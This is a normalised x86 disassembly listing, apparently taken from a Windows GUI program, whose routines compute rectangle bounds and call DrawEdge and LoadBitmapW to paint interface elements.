mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
call sub_45c330
jmp r-xdata
sub_45d27c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45dbdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000d
call sub_44cd1c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00001d
call sub_44cd1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x68 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx 0xff00000e
call sub_44c1c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00001e
call sub_44cd1c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x18 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x18 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x14 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000d
call sub_44cd1c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_45d70e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x7ff8
push 0x0
call LoadBitmapW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4520c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx 0xff000012
call sub_44c1c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x1c ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000f
call sub_44cd1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_453b68
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
call sub_44ccf0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x20 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x20 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4899c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
call sub_44cd1c
mov eax [ ebp + 0x8 ]
inc [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
movzx edx [ r-xdata ]
call sub_44c590
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x1c ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
call sub_44c1c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4055f0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor edx edx
call sub_40ac74
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
or ecx 0xffffffff
xor edx edx
call sub_40ac74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dbe2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x60 ]
call sub_45b1f0
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x1
call sub_40ac74
sub_45dbfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45e57b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_485c78
call sub_485d84
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000d
call sub_44cd1c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00001d
call sub_44cd1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x68 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx 0xff00000e
call sub_44c1c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00001e
call sub_44cd1c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x18 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x14 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
